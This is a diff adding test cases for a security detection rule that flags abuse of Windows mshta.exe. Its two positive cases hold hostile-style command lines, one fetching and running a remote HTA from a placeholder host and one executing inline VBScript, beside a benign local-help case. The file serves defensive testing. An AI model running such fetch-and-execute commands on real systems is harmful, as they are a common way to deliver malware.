@@ -1,0 +1,26 @@
+rule_id: 3aafac14-f690-44ae-95bb-a785bb558e36
+cases:
+  - name: mshta loading a remote HTA
+    expect: match
+    event:
+      Image: 'C:\Windows\System32\mshta.exe'
+      OriginalFileName: 'MSHTA.EXE'
+      CommandLine: 'mshta.exe https://cdn-update.example.net/invoice.hta'
+      ParentImage: 'C:\Windows\explorer.exe'
+      User: 'OPENSOC\jdoe'
+  - name: mshta running inline VBScript
+    expect: match
+    event:
+      Image: 'C:\Windows\SysWOW64\mshta.exe'
+      OriginalFileName: 'MSHTA.EXE'
+      CommandLine: 'mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""calc"":close")'
+      ParentImage: 'C:\Windows\System32\cmd.exe'
+      User: 'OPENSOC\jdoe'
+  - name: Local help HTA shipped with an application
+    expect: no_match
+    event:
+      Image: 'C:\Windows\System32\mshta.exe'
+      OriginalFileName: 'MSHTA.EXE'
+      CommandLine: 'mshta.exe "C:\Program Files\Contoso\Help\welcome.hta"'
+      ParentImage: 'C:\Windows\explorer.exe'
+      User: 'OPENSOC\jdoe'
